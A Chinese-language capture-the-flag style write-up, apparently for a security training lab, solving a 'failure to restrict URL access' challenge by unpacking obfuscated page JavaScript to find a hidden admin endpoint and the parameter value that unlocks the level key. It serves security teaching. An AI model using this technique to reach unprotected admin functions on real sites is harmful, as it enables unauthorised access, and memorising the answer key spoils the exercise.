#  Failure to Restrict URL Access Challenge 2(没有限制URL访问 2)

## 题介绍
需要找到以管理员账号发送请求，获得通关密钥 

## 功能实现 
查看页面，只有一个按钮，发送请求未发现有什么功能  

```
POST /challenges/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa HTTP/1.1


guestData=sOdjh318UD8ismcoa98smcj21dmdoaoIS9

```

对应解析代码  
```
try
{
	String userData = request.getParameter("adminData"); //用户请求参数 
	boolean tamperedRequest = !userData.equalsIgnoreCase("youAreAnAdminOfAwesomenessWoopWoop"); //判断是否是这个管理员值 
	if(!tamperedRequest)
		log.debug("No request tampering detected");
	else
		log.debug("User Submitted - " + userData);
	
	if(!tamperedRequest)
	{
		String userKey = Hash.generateUserSolution(levelResult, (String)ses.getAttribute("userName"));
		htmlOutput = "<h2 class='title'>" + bundle.getString("admin.clicked") + "</h2>"
			+ "<p>" + bundle.getString("admin.keyMessage.1") + "<br /> "
			+ "<a>" + userKey + "</a><br />" 
			+ bundle.getString("admin.keyMessage.2") + "</p>";
	}
	else
		htmlOutput = "<h2 class='title'>" + bundle.getString("response.failue") + "</h2>"
				+ "<p>" + bundle.getString("response.failue.message") + "</p>"
				+ "<!-- " + Encode.forHtml(userData) + " -->";
}
```

但我们请求的值是  sOdjh318UD8ismcoa98smcj21dmdoaoIS9  

在看哪里能找到 youAreAnAdminOfAwesomenessWoopWoop 这个值?  

查看页面源代码，发现如下功能   
```
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$("#A").f(3(){$("#8").5("9");$("#7").4("1");$("#2").5("1",3(){e 0=$.h({i:"j",b:"v",c:{u:"t",},d:g});m(0.6==k){$("#2").a(0.s)}q{$("#2").a("<p> l r n: "+0.6+" "+0.o+"</p>")}$("#2").4("1",3(){$("#7").5("9",3(){$("#8").4("1")})})})});$("#w").f(3(){$("#8").5("9");$("#7").4("1");$("#2").5("1",3(){e 0=$.h({i:"j",b:"x",c:{y:"z",},d:g});m(0.6==k){$("#2").a(0.s)}q{$("#2").a("<p> l r n: "+0.6+" "+0.o+"</p>")}$("#2").4("1",3(){$("#7").5("9",3(){$("#8").4("1")})})})});',37,37,'ajaxCall|slow|resultsDiv|function|show|hide|status|loadingSign|submitButton|fast|html|url|data|async|var|submit|false|ajax|type|POST|200|An|if|Occurred|statusText||else|Error|responseText|sOdjh318UD8ismcoa98smcj21dmdoaoIS9|guestData|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa|leAdministratorFormOfAwesomeness|278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin|adminData|youAreAnAdminOfAwesomenessWoopWoop|leForm'.split('|'),0,{}))

```

将eval 修改为 console.log 在浏览器控制台执行  

```
$("#leForm").submit(function() {
	$("#submitButton").hide("fast");
	$("#loadingSign").show("slow");
	$("#resultsDiv").hide("slow", function() {
		var ajaxCall = $.ajax({
			type: "POST",
			url: "278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fa",
			data: {
				guestData: "sOdjh318UD8ismcoa98smcj21dmdoaoIS9",
			},
			async: false
		});
		if (ajaxCall.status == 200) {
			$("#resultsDiv").html(ajaxCall.responseText)
		} else {
			$("#resultsDiv").html("<p> An Error Occurred: " + ajaxCall.status + " " + ajaxCall.statusText + "</p>")
		}
		$("#resultsDiv").show("slow", function() {
			$("#loadingSign").hide("fast", function() {
				$("#submitButton").show("slow")
			})
		})
	})
});
$("#leAdministratorFormOfAwesomeness").submit(function() {
	$("#submitButton").hide("fast");
	$("#loadingSign").show("slow");
	$("#resultsDiv").hide("slow", function() {
		var ajaxCall = $.ajax({
			type: "POST",
			url: "278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin",
			data: {
				adminData: "youAreAnAdminOfAwesomenessWoopWoop",
			},
			async: false
		});
		if (ajaxCall.status == 200) {
			$("#resultsDiv").html(ajaxCall.responseText)
		} else {
			$("#resultsDiv").html("<p> An Error Occurred: " + ajaxCall.status + " " + ajaxCall.statusText + "</p>")
		}
		$("#resultsDiv").show("slow", function() {
			$("#loadingSign").hide("fast", function() {
				$("#submitButton").show("slow")
			})
		})
	})
});
undefined

```

发现管理员功能代码 ，请求的路径 278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin  
参数数  adminData=youAreAnAdminOfAwesomenessWoopWoop

## 解题步骤  

请求地址  
```
/challenges/278fa30ee727b74b9a2522a5ca3bf993087de5a0ac72adff216002abf79146fahghghmin
```

请求参数  

```
adminData=youAreAnAdminOfAwesomenessWoopWoop
```
## 总结  

前端加密比较弱，花一些时间，是可以破解出来的  